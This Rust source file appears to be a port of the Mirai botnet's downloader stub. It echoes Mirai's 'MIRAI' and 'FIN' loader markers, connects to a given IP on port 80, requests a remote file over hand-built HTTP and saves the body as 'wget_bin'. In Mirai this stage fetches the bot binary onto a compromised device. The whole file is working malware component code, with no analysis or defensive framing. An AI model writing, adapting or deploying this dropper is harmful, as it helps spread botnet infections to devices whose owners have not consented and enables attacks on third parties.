use std::fs::OpenOptions;
use std::io::{Read, Write};
use std::net::{SocketAddrV4, TcpStream, Ipv4Addr};
use std::process::exit;
use std::str::FromStr;

const EXEC_MSG: &str = "MIRAI\n";
const EXEC_MSG_LEN: usize = 6;
const DOWNLOAD_MSG: &str = "FIN\n";
const DOWNLOAD_MSG_LEN: usize = 4;

fn htons(n: u16) -> u16 {
    n.to_be()
}

fn htonl(n: u32) -> u32 {
    n.to_be()
}

fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() != 4 {
        eprintln!("Usage: {} <ip> <remote_file> <host>", args[0]);
        exit(1);
    }

    let ip_addr = &args[1];
    let remote_file = &args[2];
    let host = &args[3];

    let addr = SocketAddrV4::new(
        Ipv4Addr::from_str(ip_addr).unwrap_or_else(|_| Ipv4Addr::new(127, 0, 0, 1)),
        80,
    );

    println!("{}", EXEC_MSG);

    let mut file = OpenOptions::new()
        .write(true)
        .create(true)
        .truncate(true)
        .open("wget_bin")
        .unwrap_or_else(|_| {
            eprintln!("Failed to open file!");
            exit(1);
        });

    let mut stream = TcpStream::connect(addr).unwrap_or_else(|_| {
        eprintln!("Failed to connect to the server");
        exit(2);
    });

    stream
        .write_all(format!("GET {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n", remote_file, host).as_bytes())
        .unwrap();

    let mut header_parser: u32 = 0;
    let mut buffer = [0u8; 1];
    while header_parser != 0x0d0a0d0a {
        stream.read_exact(&mut buffer).unwrap_or_else(|_| {
            eprintln!("Error reading header");
            exit(4);
        });
        header_parser = (header_parser << 8) | buffer[0] as u32;
    }

    let mut recvbuf = [0u8; 128];
    while let Ok(bytes_read) = stream.read(&mut recvbuf) {
        if bytes_read == 0 {
            break;
        }
        file.write_all(&recvbuf[..bytes_read]).unwrap();
    }

    println!("{}", DOWNLOAD_MSG);
    exit(5);
}

